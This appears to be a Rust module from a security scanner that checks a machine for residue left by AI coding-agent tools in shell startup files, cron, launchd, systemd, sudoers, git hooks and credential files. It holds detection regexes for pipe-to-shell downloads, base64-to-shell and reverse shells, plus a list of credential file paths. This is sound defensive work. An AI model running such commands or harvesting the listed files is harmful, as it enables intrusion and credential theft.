//! The residue checks. Each appends items to the report and records itself
//! under `checks_run` or `checks_skipped`; none of them mutate anything.
//!
//! sigil:ignore-file PERSIST-001,PERSIST-007,CRED-003,CRED-031 -- this module names the crontab, sudoers and credential files it inspects

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::OnceLock;
use std::time::Duration;

use regex::Regex;

use super::{redact, Action, Context, Item, Level, Report, Skipped};
use crate::corpus::compiled::corpus;
use crate::scanner::{Phase, Severity};

/// Subprocess budget for `crontab -l`, `git config`, `npm ls`, `pip list`.
const CMD_TIMEOUT: Duration = Duration::from_secs(10);

/// Where a command runs from when it is trying not to be found.
const TEMP_PREFIXES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/", "/private/tmp/"];

/// Agent tools whose footprints this command knows about.
pub struct Tool {
    pub name: &'static str,
    pub binary: &'static str,
    pub dirs: &'static [&'static str],
}

pub const TOOLS: &[Tool] = &[
    Tool {
        name: "claude-code",
        binary: "claude",
        dirs: &[
            "~/.claude",
            "~/.claude.json",
            "~/.cache/claude-cli-nodejs",
            "~/.config/claude-code",
        ],
    },
    Tool {
        name: "cursor",
        binary: "cursor",
        dirs: &["~/.cursor", "~/.config/Cursor", "~/.cache/Cursor"],
    },
    Tool {
        name: "openclaw",
        binary: "openclaw",
        dirs: &["~/.openclaw"],
    },
    Tool {
        name: "codex",
        binary: "codex",
        dirs: &["~/.codex"],
    },
    Tool {
        name: "windsurf",
        binary: "windsurf",
        dirs: &["~/.codeium", "~/.config/Windsurf"],
    },
    Tool {
        name: "continue",
        binary: "continue",
        dirs: &["~/.continue"],
    },
    Tool {
        name: "aider",
        binary: "aider",
        dirs: &["~/.aider", "~/.aider.conf.yml"],
    },
    Tool {
        name: "cline",
        binary: "cline",
        dirs: &["~/.config/Code/User/globalStorage/saoudrizwan.claude-dev"],
    },
    Tool {
        name: "gemini-cli",
        binary: "gemini",
        dirs: &["~/.gemini"],
    },
];

/// Credential-bearing files agent tools write, with the tool that owns them.
const CREDENTIAL_FILES: &[(&str, &str)] = &[
    ("claude-code", "~/.claude.json"),
    ("claude-code", "~/.claude/.credentials.json"),
    ("claude-code", "~/.claude/settings.json"),
    ("claude-code", "~/.config/claude-code/auth.json"),
    ("openclaw", "~/.openclaw/credentials.json"), // sigil:ignore SKILL-018 -- inventory of paths to look for, never opened
    ("openclaw", "~/.openclaw/config.json"),
    ("cursor", "~/.cursor/mcp.json"),
    ("codex", "~/.codex/auth.json"), // sigil:ignore SKILL-018 -- inventory of paths to look for, never opened
    ("continue", "~/.continue/config.json"),
    ("continue", "~/.continue/config.yaml"),
    ("aider", "~/.aider.conf.yml"),
    ("gemini-cli", "~/.gemini/oauth_creds.json"),
    ("sigil", "~/.sigil/token"),
    ("sigil", "~/.sigil/config.json"),
    ("system", "~/.netrc"),
    ("npm", "~/.npmrc"),
    ("pypi", "~/.pypirc"),
    ("aws", "~/.aws/credentials"),
];

/// Endpoints whose redirection in /etc/hosts matters.
const WATCHED_HOSTS: &[&str] = &[
    "api.anthropic.com",
    "claude.ai",
    "api.openai.com",
    "generativelanguage.googleapis.com",
    "registry.npmjs.org",
    "pypi.org",
    "files.pythonhosted.org",
    "github.com",
    "objects.githubusercontent.com",
    "raw.githubusercontent.com",
    "marketplace.visualstudio.com",
    "open-vsx.org",
    "crates.io",
    "static.crates.io",
    "api.sigilsec.ai",
];

/// Globally installed packages that are agent tooling (exact names).
const AGENT_PACKAGES: &[&str] = &[
    "@anthropic-ai/claude-code",
    "@openai/codex",
    "@google/gemini-cli",
    "openclaw",
    "aider-chat",
    "aider-install",
    "cline",
    "@continuedev/cli",
    "@modelcontextprotocol/inspector",
    "mcp",
    "prism-scanner",
    "@nomarj/sigil",
    "sigil-cli",
];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

#[allow(clippy::too_many_arguments)]
fn item(
    id: &str,
    severity: Level,
    category: &str,
    title: String,
    path: &Path,
    line: Option<usize>,
    evidence: &str,
    remediation: &str,
) -> Item {
    Item {
        id: id.to_string(),
        severity,
        category: category.to_string(),
        title,
        path: path.to_string_lossy().to_string(),
        line,
        evidence: redact(evidence.trim()),
        origin: "unknown".to_string(),
        fixable: false,
        action: None,
        remediation: remediation.to_string(),
    }
}

/// Run a fixed argv with a timeout. `None` when the binary is absent, the
/// command fails, or the budget is exceeded.
pub fn run_with_timeout(argv: &[&str], cwd: Option<&Path>, stdin: Option<&str>) -> Option<String> {
    let mut cmd = Command::new(argv[0]);
    cmd.args(&argv[1..])
        .stdin(if stdin.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    if let Some(dir) = cwd {
        cmd.current_dir(dir);
    }
    let mut child = cmd.spawn().ok()?;
    if let (Some(input), Some(mut pipe)) = (stdin, child.stdin.take()) {
        use std::io::Write;
        let _ = pipe.write_all(input.as_bytes());
    }
    let started = std::time::Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                let mut out = String::new();
                if let Some(mut stdout) = child.stdout.take() {
                    use std::io::Read;
                    let _ = stdout.read_to_string(&mut out);
                }
                return if status.success() { Some(out) } else { None };
            }
            Ok(None) if started.elapsed() > CMD_TIMEOUT => {
                let _ = child.kill();
                return None;
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(25)),
            Err(_) => return None,
        }
    }
}

/// Is `bin` on PATH?
pub fn on_path(bin: &str) -> bool {
    let Some(paths) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&paths).any(|p| p.join(bin).is_file())
}

fn tool_for_binary(bin: &str) -> Option<&'static Tool> {
    TOOLS.iter().find(|t| t.binary == bin)
}

/// Strongest scanner finding over a piece of text, through the compiled
/// corpus: the same rules `sigil scan` runs, applied to a command line.
fn corpus_verdict(text: &str) -> Option<(Level, String)> {
    let c = corpus();
    let mut best: Option<(Severity, String)> = None;
    for phase in [
        Phase::NetworkExfil,
        Phase::Obfuscation,
        Phase::CodePatterns,
        Phase::Credentials,
    ] {
        for f in c.scan_phase(phase, "residue", "residue", text) {
            if best.as_ref().is_none_or(|(s, _)| f.severity > *s) {
                best = Some((f.severity, f.rule.clone()));
            }
        }
    }
    best.map(|(s, rule)| (Level::from_scan(s), rule))
}

fn re(pattern: &'static str, cell: &'static OnceLock<Regex>) -> &'static Regex {
    cell.get_or_init(|| Regex::new(pattern).expect("residue regex compiles"))
}

static PIPE_TO_SHELL: OnceLock<Regex> = OnceLock::new();
static DECODE_TO_SHELL: OnceLock<Regex> = OnceLock::new();
static EVAL_REMOTE: OnceLock<Regex> = OnceLock::new();
static PY_INLINE: OnceLock<Regex> = OnceLock::new();
static REVSHELL: OnceLock<Regex> = OnceLock::new();

/// Judge a command a persistence entry or a hook would run.
///
/// Returns the level and the reason, or `None` when there is nothing to say
/// about it (the ordinary case: a command that runs an existing binary from
/// a normal location and matches no rule).
pub fn classify_command(ctx: &Context, cmd: &str) -> Option<(Level, String)> {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return None;
    }
    if re(
        r"(curl|wget)[^|\n]*\|\s*(sudo\s+)?(sh|bash|zsh|python3?)\b",
        &PIPE_TO_SHELL,
    )
    .is_match(cmd)
    {
        return Some((
            Level::Critical,
            "downloads and pipes into a shell".to_string(),
        ));
    }
    if re(r"base64\s+(-d|--decode|-D)[^|\n]*\|\s*(sudo\s+)?(sh|bash|zsh)\b|\|\s*base64\s+(-d|--decode|-D)\s*\|\s*(sh|bash)", &DECODE_TO_SHELL).is_match(cmd) {
        return Some((Level::Critical, "decodes base64 into a shell".to_string()));
    }
    if re(
        r"\b(eval|source|\.)\s+[^\n]*(\$\(\s*(curl|wget)|https?://|/tmp/|/dev/shm/|/var/tmp/)",
        &EVAL_REMOTE,
    )
    .is_match(cmd)
    {
        return Some((
            Level::Critical,
            "evaluates remote or temporary content".to_string(),
        ));
    }
    if re(
        r"python3?\s+-c\s+[^\n]*(socket|subprocess|os\.system|exec\(|__import__)",
        &PY_INLINE,
    )
    .is_match(cmd)
    {
        return Some((
            Level::Critical,
            "inline Python with execution or sockets".to_string(),
        ));
    }
    if re(
        r"\bnc\b[^\n]*\s-e\s|/dev/tcp/|\bncat\b[^\n]*--exec|\bsocat\b[^\n]*exec:",
        &REVSHELL,
    )
    .is_match(cmd)
    {
        return Some((Level::Critical, "reverse shell shape".to_string()));
    }

    // Where does the executable live?
    let exe = first_executable(cmd);
    if let Some(exe) = exe.as_deref() {
        let expanded = ctx.expand(exe);
        if is_temp_path(ctx, &expanded) {
            return Some((
                Level::Critical,
                format!("runs from a temporary or cache path: {exe}"),
            ));
        }
        if exe.contains('/') {
            if !expanded.exists() {
                return Some((Level::High, format!("executable no longer exists: {exe}")));
            }
            if let Some(tool) = TOOLS.iter().find(|t| {
                t.dirs.iter().any(|d| {
                    let dir = ctx.expand(d);
                    expanded.starts_with(&dir)
                })
            }) {
                return Some((
                    Level::Medium,
                    format!("runs from the {} tool directory", tool.name),
                ));
            }
        } else if let Some(tool) = tool_for_binary(exe) {
            return Some(if on_path(exe) {
                (Level::Info, format!("runs the {} agent tool", tool.name))
            } else {
                (
                    Level::High,
                    format!("runs {}, which is no longer installed", tool.name),
                )
            });
        }
    }

    // Anything the scanner would flag in shipped code is worth flagging here.
    if let Some((level, rule)) = corpus_verdict(cmd) {
        if level >= Level::Medium {
            return Some((level, format!("matches scan rule {rule}")));
        }
    }
    None
}

/// The first token of a command that is not an environment assignment or a
/// wrapper (`sudo`, `nohup`, `env`, `nice`, `exec`).
fn first_executable(cmd: &str) -> Option<String> {
    for tok in cmd.split_whitespace() {
        if tok.contains('=') && !tok.starts_with('/') && !tok.starts_with('.') {
            continue;
        }
        match tok {
            "sudo" | "nohup" | "env" | "nice" | "exec" | "-" | "@reboot" | "@daily" | "@hourly"
            | "@weekly" | "@monthly" | "@yearly" | "@annually" => continue,
            _ => return Some(tok.trim_matches('"').trim_matches('\'').to_string()),
        }
    }
    None
}

/// Is this expanded path under a temporary directory or the user's cache?
///
/// A home directory that itself lives under `/tmp` (test sandboxes, some CI
/// runners) is not "temporary" for this purpose: only paths outside the home
/// count against the temp prefixes, while `~/.cache` always counts.
fn is_temp_path(ctx: &Context, expanded: &Path) -> bool {
    let text = expanded.to_string_lossy();
    let under_home = expanded.starts_with(&ctx.home);
    let in_temp = TEMP_PREFIXES.iter().any(|p| text.starts_with(p)) && !under_home;
    let in_cache = expanded.starts_with(ctx.expand("~/.cache"));
    in_temp || in_cache
}

// ---------------------------------------------------------------------------
// RES-SHELL: shell startup files
// ---------------------------------------------------------------------------

pub const ALIAS_BLOCK_START: &str = "# >>> sigil aliases >>>";
pub const ALIAS_BLOCK_END: &str = "# <<< sigil aliases <<<";
/// The body `sigil setup shell` and `install.sh --with-aliases` write.
pub const ALIAS_BLOCK_BODY: [&str; 3] = [
    "alias gclone='sigil clone'",
    "alias safepip='sigil pip'",
    "alias safenpm='sigil npm'",
];

const RC_FILES: &[&str] = &[
    "~/.zshenv",
    "~/.zprofile",
    "~/.zshrc",
    "~/.zlogin",
    "~/.bash_profile",
    "~/.bash_login",
    "~/.bashrc",
    "~/.profile",
    "~/.config/fish/config.fish",
];

static PATH_ASSIGN: OnceLock<Regex> = OnceLock::new();
static ALIAS_LINE: OnceLock<Regex> = OnceLock::new();

pub fn shell_rc(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-SHELL".to_string());
    for rc in RC_FILES {
        let path = ctx.expand(rc);
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        scan_rc_text(ctx, &path, &text, report);
    }
    // /etc/profile.d is system-wide: report-only.
    if let Ok(entries) = std::fs::read_dir("/etc/profile.d") {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().is_some_and(|e| e == "sh") {
                if let Ok(text) = std::fs::read_to_string(&path) {
                    scan_rc_text(ctx, &path, &text, report);
                }
            }
        }
    }
}

fn scan_rc_text(ctx: &Context, path: &Path, text: &str, report: &mut Report) {
    let fixable_here = ctx.in_home(path);
    let lines: Vec<&str> = text.lines().collect();
    // Lines consumed by a recognised block are skipped up to this index.
    let mut skip_until: usize = 0;
    for (i, raw) in lines.iter().enumerate() {
        if i < skip_until {
            continue;
        }
        let raw = *raw;
        let line = raw.trim();
        let line_no = i + 1;

        // Sigil's own alias block: inventory, or tamper if it differs.
        if line == ALIAS_BLOCK_START {
            let end = lines[i..]
                .iter()
                .position(|l| l.trim() == ALIAS_BLOCK_END)
                .map(|p| i + p);
            let body: Vec<&str> = match end {
                Some(e) => lines[i + 1..e]
                    .iter()
                    .map(|l| l.trim())
                    .filter(|l| !l.is_empty())
                    .collect(),
                None => Vec::new(),
            };
            let intact = end.is_some() && body == ALIAS_BLOCK_BODY;
            let mut it = if intact {
                item("RES-SHELL-004", Level::Info, "shell_rc", "Sigil alias block (gclone/safepip/safenpm)".to_string(), path, Some(line_no), raw, "Installed by `sigil setup shell`; remove the block by hand if Sigil is uninstalled.")
            } else {
                item("RES-SHELL-005", Level::High, "shell_rc", "Sigil alias block has been altered".to_string(), path, Some(line_no), &body.join(" | "), "The block between the sigil markers does not match what Sigil writes. Review it: something else edited it, or is hiding inside it.")
            };
            it.origin = "sigil-setup".to_string();
            report.items.push(it);
            skip_until = end.map(|e| e + 1).unwrap_or(i + 1);
            continue;
        }
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        let mut push = |mut it: Item, action: Option<Action>| {
            if fixable_here {
                if let Some(a) = action {
                    it.fixable = true;
                    it.action = Some(a);
                }
            }
            report.items.push(it);
        };
        let remove = || Action::RemoveLine {
            path: path.to_string_lossy().to_string(),
            line: line_no,
            content: raw.to_string(),
        };

        // RES-SHELL-001: eval/source of remote or temporary content.
        if re(
            r"\b(eval|source|\.)\s+[^\n]*(\$\(\s*(curl|wget)|https?://|/tmp/|/dev/shm/|/var/tmp/)",
            &EVAL_REMOTE,
        )
        .is_match(line)
            || re(
                r"(curl|wget)[^|\n]*\|\s*(sudo\s+)?(sh|bash|zsh|python3?)\b",
                &PIPE_TO_SHELL,
            )
            .is_match(line)
        {
            push(
                item("RES-SHELL-001", Level::Critical, "shell_rc", "Startup file evaluates remote or temporary content".to_string(), path, Some(line_no), raw, "Every new shell runs this. Remove the line; if a tool needs it, install that tool properly and pin what it sources."),
                Some(remove()),
            );
            continue;
        }

        // RES-SHELL-002: PATH entries.
        if let Some(caps) = re(
            r"(?:^|\s)(?:export\s+)?PATH=(\S+)|set\s+-gx\s+PATH\s+(.+)$",
            &PATH_ASSIGN,
        )
        .captures(line)
        {
            let value = caps
                .get(1)
                .or(caps.get(2))
                .map(|m| m.as_str())
                .unwrap_or("");
            let parts: Vec<String> = value
                .trim_matches('"')
                .trim_matches('\'')
                .split([':', ' '])
                .map(|p| p.trim_matches('"').to_string())
                .filter(|p| !p.is_empty() && p != "$PATH" && p != "${PATH}")
                .collect();
            for part in parts {
                let expanded = ctx.expand(&part);
                if is_temp_path(ctx, &expanded) {
                    push(
                        item("RES-SHELL-002", Level::High, "shell_rc", format!("PATH includes a temporary or cache directory: {part}"), path, Some(line_no), raw, "Binaries found first in a temporary directory win over the real ones. Remove the entry."),
                        Some(remove()),
                    );
                    break;
                }
                if part.contains('$') && !part.starts_with("$HOME") && !part.starts_with("${HOME}")
                {
                    continue; // unresolvable variable; not judged
                }
                if let Some(tool) = TOOLS
                    .iter()
                    .find(|t| t.dirs.iter().any(|d| expanded.starts_with(ctx.expand(d))))
                {
                    let level = if expanded.exists() {
                        Level::Info
                    } else {
                        Level::Low
                    };
                    push(
                        item(
                            "RES-SHELL-002",
                            level,
                            "shell_rc",
                            format!(
                                "PATH entry for {}: {part}{}",
                                tool.name,
                                if expanded.exists() {
                                    ""
                                } else {
                                    " (directory missing)"
                                }
                            ),
                            path,
                            Some(line_no),
                            raw,
                            if expanded.exists() {
                                "Inventory: the tool is still installed."
                            } else {
                                "The tool directory is gone; the PATH entry is residue. Remove it."
                            },
                        ),
                        None,
                    );
                    break;
                }
            }
            continue;
        }

        // RES-SHELL-003: aliases that hijack everyday commands.
        if let Some(caps) = re(r"^alias\s+(git|npm|npx|pip|pip3|python3?|sudo|curl|wget|ssh|claude|cursor|code|node|cargo)=(.*)$", &ALIAS_LINE).captures(line) {
            let name = &caps[1];
            let target = caps[2].trim_matches(['"', '\'']);
            let bad = first_executable(target)
                .is_some_and(|exe| is_temp_path(ctx, &ctx.expand(&exe)))
                || target.contains("http://")
                || target.contains("https://")
                || target.contains("curl ")
                || target.contains("wget ");
            if bad {
                push(
                    item("RES-SHELL-003", Level::High, "shell_rc", format!("`{name}` is aliased to something that fetches or runs from a temporary path"), path, Some(line_no), raw, "An alias over a tool everyone types is how a foothold survives. Remove it."),
                    Some(remove()),
                );
            } else if let Some(exe) = first_executable(target) {
                if exe.contains('/') && !ctx.expand(&exe).exists() {
                    push(
                        item("RES-SHELL-003", Level::Medium, "shell_rc", format!("`{name}` is aliased to a path that no longer exists"), path, Some(line_no), raw, "The target is gone; every invocation now fails. Remove the alias."),
                        Some(remove()),
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// RES-PERSIST: cron, launchd, systemd, autostart, sudoers
// ---------------------------------------------------------------------------

pub fn persistence(ctx: &Context, report: &mut Report) {
    crontab(ctx, report);
    #[cfg(target_os = "macos")]
    launchd(ctx, report);
    #[cfg(target_os = "linux")]
    systemd(ctx, report);
    autostart(ctx, report);
    sudoers(ctx, report);
}

fn crontab(ctx: &Context, report: &mut Report) {
    if !on_path("crontab") {
        report.checks_skipped.push(Skipped {
            id: "RES-PERSIST-001".to_string(),
            reason: "crontab not found".to_string(),
        });
    } else {
        report.checks_run.push("RES-PERSIST-001".to_string());
        if let Some(out) = run_with_timeout(&["crontab", "-l"], None, None) {
            for (idx, raw) in out.lines().enumerate() {
                let line = raw.trim();
                if line.is_empty()
                    || line.starts_with('#')
                    || (line.contains('=')
                        && !line.starts_with('@')
                        && line.split_whitespace().count() < 6)
                {
                    continue;
                }
                if let Some(cmd) = cron_command(line, false) {
                    if let Some((level, reason)) = classify_command(ctx, &cmd) {
                        let mut it = item("RES-PERSIST-001", level, "persistence", format!("Cron entry {reason}"), Path::new("crontab"), Some(idx + 1), raw, "Remove the entry (`crontab -e`) unless you installed it yourself and still need it.");
                        if level >= Level::High {
                            it.fixable = true;
                            it.action = Some(Action::RemoveCrontabLine {
                                content: raw.to_string(),
                            });
                        }
                        report.items.push(it);
                    }
                }
            }
        }
    }
    // System cron: report-only.
    let mut system_files: Vec<PathBuf> = vec![PathBuf::from("/etc/crontab")];
    if let Ok(entries) = std::fs::read_dir("/etc/cron.d") {
        system_files.extend(entries.flatten().map(|e| e.path()).filter(|p| p.is_file()));
    }
    for path in system_files {
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        for (idx, raw) in text.lines().enumerate() {
            let line = raw.trim();
            if line.is_empty()
                || line.starts_with('#')
                || (line.contains('=') && line.split_whitespace().count() < 7)
            {
                continue;
            }
            if let Some(cmd) = cron_command(line, true) {
                if let Some((level, reason)) = classify_command(ctx, &cmd) {
                    report.items.push(item("RES-PERSIST-001", level, "persistence", format!("System cron entry {reason}"), &path, Some(idx + 1), raw, "System cron files are root-owned and never changed by `sigil residue apply`; review and remove by hand."));
                }
            }
        }
    }
}

/// The command part of a cron line. System cron lines carry a user field.
fn cron_command(line: &str, has_user: bool) -> Option<String> {
    let fields: Vec<&str> = line.split_whitespace().collect();
    let skip = if line.starts_with('@') { 1 } else { 5 } + usize::from(has_user);
    if fields.len() <= skip {
        return None;
    }
    Some(fields[skip..].join(" "))
}

#[cfg(target_os = "macos")]
fn launchd(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-PERSIST-002".to_string());
    let user_dir = ctx.expand("~/Library/LaunchAgents");
    let dirs = [
        (user_dir.clone(), true),
        (PathBuf::from("/Library/LaunchAgents"), false),
        (PathBuf::from("/Library/LaunchDaemons"), false),
    ];
    for (dir, fixable) in dirs {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().is_none_or(|e| e != "plist") || !path.is_file() {
                continue;
            }
            let Ok(bytes) = std::fs::read(&path) else {
                continue;
            };
            if bytes.starts_with(b"bplist") {
                report.items.push(item("RES-PERSIST-002", Level::Low, "persistence", "Binary launchd plist (not parsed)".to_string(), &path, None, "", "Inspect with `plutil -p <file>`; remove with `launchctl unload` + `rm` if it is residue."));
                continue;
            }
            let text = String::from_utf8_lossy(&bytes);
            let strings: Vec<String> = Regex::new(r"<string>([^<]*)</string>")
                .unwrap()
                .captures_iter(&text)
                .map(|c| c[1].to_string())
                .collect();
            let cmd = strings.join(" ");
            if let Some((level, reason)) = classify_command(ctx, &cmd) {
                let mut it = item(
                    "RES-PERSIST-002",
                    level,
                    "persistence",
                    format!("launchd job {reason}"),
                    &path,
                    None,
                    &cmd,
                    "Unload and remove the plist (`launchctl unload <file> && rm <file>`).",
                );
                if fixable && level >= Level::High && path.is_file() {
                    it.fixable = true;
                    it.action = Some(Action::RemoveFile {
                        path: it.path.clone(),
                    });
                }
                report.items.push(it);
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn systemd(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-PERSIST-003".to_string());
    let user_dir = ctx.expand("~/.config/systemd/user");
    let dirs = [
        (user_dir, true),
        (PathBuf::from("/etc/systemd/system"), false),
    ];
    for (dir, fixable) in dirs {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let is_unit = path
                .extension()
                .is_some_and(|e| e == "service" || e == "timer");
            let is_symlink =
                std::fs::symlink_metadata(&path).is_ok_and(|m| m.file_type().is_symlink());
            if !is_unit || is_symlink || !path.is_file() {
                continue;
            }
            let Ok(text) = std::fs::read_to_string(&path) else {
                continue;
            };
            for (idx, raw) in text.lines().enumerate() {
                let line = raw.trim();
                let Some(value) = line
                    .strip_prefix("ExecStart=")
                    .or_else(|| line.strip_prefix("ExecStartPre="))
                else {
                    continue;
                };
                let cmd = value
                    .trim_start_matches(['-', '@', '+', '!', ':'])
                    .to_string();
                if let Some((level, reason)) = classify_command(ctx, &cmd) {
                    let mut it = item("RES-PERSIST-003", level, "persistence", format!("systemd unit {reason}"), &path, Some(idx + 1), raw, "Disable and remove the unit (`systemctl --user disable --now <unit>`, then delete the file).");
                    if fixable && level >= Level::High {
                        it.fixable = true;
                        it.action = Some(Action::RemoveFile {
                            path: it.path.clone(),
                        });
                    }
                    report.items.push(it);
                }
            }
        }
    }
}

fn autostart(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-PERSIST-005".to_string());
    for (dir, fixable) in [
        (ctx.expand("~/.config/autostart"), true),
        (PathBuf::from("/etc/xdg/autostart"), false),
    ] {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().is_none_or(|e| e != "desktop") || !path.is_file() {
                continue;
            }
            let Ok(text) = std::fs::read_to_string(&path) else {
                continue;
            };
            for (idx, raw) in text.lines().enumerate() {
                let Some(cmd) = raw.trim().strip_prefix("Exec=") else {
                    continue;
                };
                if let Some((level, reason)) = classify_command(ctx, cmd) {
                    let mut it = item(
                        "RES-PERSIST-005",
                        level,
                        "persistence",
                        format!("Autostart entry {reason}"),
                        &path,
                        Some(idx + 1),
                        raw,
                        "Remove the .desktop file if it is residue.",
                    );
                    if fixable && level >= Level::High {
                        it.fixable = true;
                        it.action = Some(Action::RemoveFile {
                            path: it.path.clone(),
                        });
                    }
                    report.items.push(it);
                }
            }
        }
    }
}

fn sudoers(_ctx: &Context, report: &mut Report) {
    let Ok(entries) = std::fs::read_dir("/etc/sudoers.d") else {
        report.checks_skipped.push(Skipped {
            id: "RES-PERSIST-004".to_string(),
            reason: "/etc/sudoers.d not readable".to_string(),
        });
        return;
    };
    report.checks_run.push("RES-PERSIST-004".to_string());
    let nopasswd = Regex::new(r"NOPASSWD\s*:\s*ALL|ALL\s*=\s*\(ALL(:ALL)?\)\s*NOPASSWD").unwrap();
    for entry in entries.flatten() {
        let path = entry.path();
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        for (idx, raw) in text.lines().enumerate() {
            if nopasswd.is_match(raw) {
                report.items.push(item("RES-PERSIST-004", Level::Critical, "persistence", "Passwordless sudo grant".to_string(), &path, Some(idx + 1), raw, "Root-owned and never changed by `sigil residue apply`. Review with `visudo -f <file>` and remove the grant unless you created it."));
            }
        }
    }
}

// ---------------------------------------------------------------------------
// RES-HOOK: git hooks in the repo, the templates, and core.hooksPath
// ---------------------------------------------------------------------------

pub const HOOK_MARKER: &str = "# sigil pre-commit hook";

/// The hook body `sigil setup git` writes.
pub fn sigil_hook_body() -> String {
    format!(
        "#!/bin/sh\n{HOOK_MARKER}\n# Scans the repository before each commit; blocks on HIGH/CRITICAL findings.\n# Bypass a single commit with: git commit --no-verify\nif ! command -v sigil >/dev/null 2>&1; then\n  echo \"sigil: binary not found on PATH — skipping pre-commit scan\" >&2\n  exit 0\nfi\nexec sigil scan . --fail-on high\n"
    )
}

pub fn git_hooks(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-HOOK-001".to_string());
    let mut hook_dirs: Vec<PathBuf> = Vec::new();
    if let Some(repo) = &ctx.repo {
        hook_dirs.push(repo.join(".git").join("hooks"));
        if on_path("git") {
            if let Some(p) = run_with_timeout(
                &["git", "config", "--get", "core.hooksPath"],
                Some(repo),
                None,
            ) {
                let p = p.trim();
                if !p.is_empty() {
                    let resolved = if Path::new(p).is_absolute() {
                        PathBuf::from(p)
                    } else {
                        repo.join(p)
                    };
                    hook_dirs.push(resolved);
                }
            }
        }
    }
    if on_path("git") {
        if let Some(p) = run_with_timeout(
            &["git", "config", "--global", "--get", "core.hooksPath"],
            None,
            None,
        ) {
            let p = p.trim();
            if !p.is_empty() {
                hook_dirs.push(ctx.expand(p));
            }
        }
        if let Some(p) = run_with_timeout(
            &["git", "config", "--global", "--get", "init.templateDir"],
            None,
            None,
        ) {
            let p = p.trim();
            if !p.is_empty() {
                hook_dirs.push(ctx.expand(p).join("hooks"));
            }
        }
    }
    hook_dirs.push(ctx.expand("~/.git-templates/hooks"));
    hook_dirs.sort();
    hook_dirs.dedup();

    let expected = sigil_hook_body();
    for dir in hook_dirs {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default();
            if name.ends_with(".sample") || !path.is_file() || !is_executable(&path) {
                continue;
            }
            let Ok(bytes) = std::fs::read(&path) else {
                continue;
            };
            let text = String::from_utf8_lossy(&bytes).to_string();
            let fixable =
                ctx.in_home(&path) || ctx.repo.as_ref().is_some_and(|r| path.starts_with(r));
            let mut it = if text.contains(HOOK_MARKER) {
                if text == expected {
                    let mut it = item(
                        "RES-HOOK-001",
                        Level::Info,
                        "git_hook",
                        format!("Sigil pre-commit hook ({name})"),
                        &path,
                        None,
                        "",
                        "Installed by `sigil setup git`.",
                    );
                    it.origin = "sigil-setup".to_string();
                    it
                } else {
                    let mut it = item("RES-HOOK-001", Level::High, "git_hook", format!("Sigil pre-commit hook has been altered ({name})"), &path, None, text.lines().nth(2).unwrap_or(""), "The hook carries Sigil's marker but not Sigil's body. Review it; reinstall with `sigil setup git`.");
                    it.origin = "sigil-setup".to_string();
                    it
                }
            } else {
                let framework = ["husky", "lefthook", "simple-git-hooks", "pre-commit"]
                    .iter()
                    .find(|f| text.contains(*f))
                    .copied();
                match classify_command(ctx, &text).or_else(|| {
                    corpus_verdict(&text).map(|(l, r)| (l, format!("matches scan rule {r}")))
                }) {
                    Some((level, reason)) => {
                        let level = match framework {
                            Some(_)
                                if level > Level::Medium
                                    && !text.contains("curl")
                                    && !text.contains("wget") =>
                            {
                                Level::Medium
                            }
                            _ => level,
                        };
                        let mut it = item("RES-HOOK-001", level, "git_hook", format!("Executable git hook `{name}` {reason}"), &path, None, text.lines().find(|l| !l.starts_with('#') && !l.trim().is_empty()).unwrap_or(""), "Hooks run with your credentials on every commit, checkout or push. Remove it unless you installed it and still want it.");
                        if let Some(f) = framework {
                            it.origin = format!("installer:{f}");
                        }
                        it
                    }
                    None => {
                        let mut it = item(
                            "RES-HOOK-001",
                            Level::Info,
                            "git_hook",
                            format!("Executable git hook `{name}`"),
                            &path,
                            None,
                            "",
                            "Inventory: an active hook that matched no rule.",
                        );
                        if let Some(f) = framework {
                            it.origin = format!("installer:{f}");
                        }
                        it
                    }
                }
            };
            if fixable && it.severity >= Level::High && it.origin != "sigil-setup" {
                it.fixable = true;
                it.action = Some(Action::RemoveFile {
                    path: it.path.clone(),
                });
            }
            report.items.push(it);
        }
    }
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path).is_ok_and(|m| m.permissions().mode() & 0o111 != 0)
}

#[cfg(not(unix))]
fn is_executable(_path: &Path) -> bool {
    true
}

// ---------------------------------------------------------------------------
// RES-CRED: credential files and their permissions
// ---------------------------------------------------------------------------

#[cfg(unix)]
pub fn file_mode(path: &Path) -> Option<u32> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::symlink_metadata(path)
        .ok()
        .map(|m| m.permissions().mode() & 0o777)
}

#[cfg(not(unix))]
pub fn file_mode(_path: &Path) -> Option<u32> {
    None
}

pub fn credentials(ctx: &Context, report: &mut Report) {
    report.checks_run.push("RES-CRED".to_string());
    for (tool, rel) in CREDENTIAL_FILES {
        let path = ctx.expand(rel);
